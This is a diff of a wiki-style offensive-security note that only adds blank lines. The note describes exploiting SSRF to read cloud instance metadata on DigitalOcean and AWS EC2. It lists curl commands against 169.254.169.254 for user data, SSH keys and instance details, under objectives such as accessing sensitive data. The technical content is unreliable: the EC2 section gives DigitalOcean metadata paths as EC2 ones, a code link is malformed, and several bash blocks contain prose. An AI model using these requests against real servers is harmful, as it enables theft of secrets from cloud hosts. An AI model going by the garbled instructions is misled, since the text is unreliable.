@@ -42,6 +42,8 @@ This procedure involves the exploitation of Server-Side Request Forgery (SSRF) v
 
 This procedure involves the exploitation of Server-Side Request Forgery (SSRF) vulnerabilities in order to access sensitive information from cloud instances. By sending crafted requests to the server, attackers can trick the server into accessing sensitive resources and returning the results. In this case, we are focusing on SSRF URLs for DigitalOcean and AWS EC2 instances. This technique can be used for reconnaissance purposes, to gather information about the cloud infrastructure, and to potentially gain access to sensitive data.
 
+ 
+
 ## Requirements
 
 1. Access to the vulnerable server
@@ -49,6 +51,8 @@ This procedure involves the exploitation of Server-Side Request Forgery (SSRF) v
 1. Knowledge of SSRF vulnerabilities
 
 1. Access to tools for crafting requests
+
+ 
 
 ## Defense
 
@@ -58,19 +62,31 @@ This procedure involves the exploitation of Server-Side Request Forgery (SSRF) v
 
 1. Monitor network traffic for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Gather information about the cloud infrastructure
 
 1. Access sensitive data from cloud instances
 
+ 
+
 # Instructions
 
 1. To access DigitalOcean metadata, use the following command:
 
+ 
+
+
+
 **Code**: [[https://developers.digitalocean.com/documentation/]]
 
+
+
 > curl -H 'Metadata-Flavor: DigitalOcean' http://169.254.169.254/metadata/v1/
+
+
 
 **Command** ([[Accessing Metadata]]):
 
@@ -78,11 +94,19 @@ This procedure involves the exploitation of Server-Side Request Forgery (SSRF) v
 To access metadata, send an HTTP request to the metadata service with the appropriate path for the data you want to retrieve.
 ```
 
+
+
+
+
 **Command** ([[Retrieving Droplet Metadata]]):
 
 ```bash
 To retrieve metadata about a Droplet, send an HTTP request to the metadata service with the path /metadata/v1.json.
 ```
+
+
+
+
 
 **Command** ([[Retrieving User Data]]):
 
@@ -90,11 +114,19 @@ To retrieve metadata about a Droplet, send an HTTP request to the metadata servi
 To retrieve user data, send an HTTP request to the metadata service with the path /metadata/v1/user-data.
 ```
 
+
+
+
+
 **Command** ([[Retrieving SSH Keys]]):
 
 ```bash
 To retrieve SSH keys, send an HTTP request to the metadata service with the path /metadata/v1/ssh-keys.
 ```
+
+
+
+
 
 **Command** ([[Retrieving Metadata from within a Droplet]]):
 
@@ -102,12 +134,22 @@ To retrieve SSH keys, send an HTTP request to the metadata service with the path
 To retrieve metadata from within a Droplet, send an HTTP request to 169.254.169.254 with the appropriate path for the data you want to retrieve.
 ```
 
+
+
 2. To retrieve metadata of an EC2 instance, use the following command:
+
+ 
+
+
 
 **Code**: [[curl http://169.254.169.254/metadata/v1/id
 http://]]
 
+
+
 > This command retrieves metadata of an EC2 instance such as its ID, user data, hostname, region, and IPv6 address. The command can be run from within the EC2 instance as it accesses the instance metadata service available at a pre-defined IP address. The 'jq' command is used to format the output of the JSON response. The 'curl' command is used to make HTTP requests to the metadata service. You can also retrieve all the metadata in one request by using the command 'curl http://169.254.169.254/metadata/v1.json | jq'.
+
+
 
 **Command** ([[Get metadata information]]):
 
@@ -122,11 +164,19 @@ http://169.254.169.254/metadata/v1/region
 http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
 ```
 
+
+
+
+
 **Command** ([[Get metadata information in JSON format]]):
 
 ```bash
 curl http://169.254.169.254/metadata/v1.json
 ```
+
+
+
+
 
 **Command** ([[Get metadata information using curl]]):
 
@@ -134,11 +184,19 @@ curl http://169.254.169.254/metadata/v1.json
 curl http://169.254.169.254/metadata/v1/
 ```
 
+
+
+
+
 **Command** ([[Get user data information]]):
 
 ```bash
 curl http://169.254.169.254/metadata/v1/user-data
 ```
+
+
+
+
 
 **Command** ([[Get hostname information]]):
 
@@ -146,11 +204,19 @@ curl http://169.254.169.254/metadata/v1/user-data
 curl http://169.254.169.254/metadata/v1/hostname
 ```
 
+
+
+
+
 **Command** ([[Get region information]]):
 
 ```bash
 curl http://169.254.169.254/metadata/v1/region
 ```
+
+
+
+
 
 **Command** ([[Get IPv6 address]]):
 
@@ -158,11 +224,17 @@ curl http://169.254.169.254/metadata/v1/region
 curl http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
 ```
 
+
+
+
+
 **Command** ([[Get metadata information in JSON format using jq]]):
 
 ```bash
 curl http://169.254.169.254/metadata/v1.json | jq
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -195,3 +267,5 @@ curl http://169.254.169.254/metadata/v1.json | jq
 - [[Server-Side Request Forgery]]
 - [[SSRF URL for Cloud Instances]]
 - [[SSRF URL for Digital Ocean]]
+
+
